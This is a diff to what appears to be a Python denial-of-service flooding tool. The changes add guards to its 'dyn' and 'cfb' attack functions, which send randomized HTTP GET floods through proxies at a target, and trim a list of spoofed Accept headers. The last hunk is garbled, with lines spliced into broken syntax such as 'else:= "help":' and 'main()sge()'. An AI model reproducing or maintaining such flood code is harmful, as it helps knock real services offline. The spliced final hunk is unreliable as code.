@@ -448,6 +448,9 @@ def stop():
 
 def dyn(event, socks_type):
     header = Headers("dyn")
+    if not proxies:
+        print(f"{red_color}[!] Proxy list is empty. Aborting dyn attack.")
+        return
     proxy = Choice(proxies).strip().split(":")
     get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + random_data() + "." + target + "\r\n"
 
@@ -699,6 +702,9 @@ def cookie(event, socks_type):
 
 def cfb(event, socks_type):
     header = Headers("get")
+    if not proxies:
+        print(f"{red_color}[!] Proxy list is empty. Aborting cfb attack.")
+        return
     proxy = Choice(proxies).strip().split(":")
     get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
@@ -1725,10 +1731,6 @@ if __name__ == '__main__':
         "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
         "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
         "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5",
-        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5",
-        "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
-        "Accept: text/html, application/xhtml+xml",
-        "Accept-Language: en-US,en;q=0.5",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
         "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
     ]
@@ -1767,16 +1769,15 @@ if __name__ == '__main__':
                 tools()
             elif bdr == "stop":
                 stop()
-            elif bdr == "help":
                 usge()
-            elif len(sys.argv) <= int(7):
-                usge()
-            else:
-                main()
-        except IndexError:
+            else:= "help":
+                main()sge()
+        except IndexError:ys.argv) <= int(7):
             usge()
     except KeyboardInterrupt:
         sys.exit()
-    except IndexError:
+    except IndexError:exError:
+        usge()
+boardInterrupt:
         usge()
 
